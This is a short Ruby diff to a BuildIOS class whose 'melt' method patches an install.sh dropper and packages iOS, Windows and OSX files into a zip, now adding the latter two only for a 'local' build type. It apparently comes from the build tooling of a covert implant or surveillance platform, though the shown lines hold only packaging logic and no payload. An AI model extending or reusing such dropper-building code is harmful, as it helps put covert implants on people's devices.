@@ -55,7 +55,7 @@ class BuildIOS < Build
 
   def melt(params)
     trace :debug, "Build: melting: #{params}"
-	
+
     # open the install.sh dropper and patch the value of the files to be installed
     file = File.open(path('install.sh'), 'rb+')
     content = file.read
@@ -114,12 +114,14 @@ class BuildIOS < Build
       Dir[path('ios/**')].each do |file|
         z.file.open("ios/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
       end
-      Dir[path('win/**')].each do |file|
-        z.file.open("win/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
-      end
-      Dir[path('osx/**/**')].each do |file|
-        next if File.directory? file
-        z.file.open("#{file.gsub(path(''), '')}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
+      if params['type'] == 'local'
+        Dir[path('win/**')].each do |file|
+          z.file.open("win/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
+        end
+        Dir[path('osx/**/**')].each do |file|
+          next if File.directory? file
+          z.file.open("#{file.gsub(path(''), '')}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
+        end
       end
     end
 
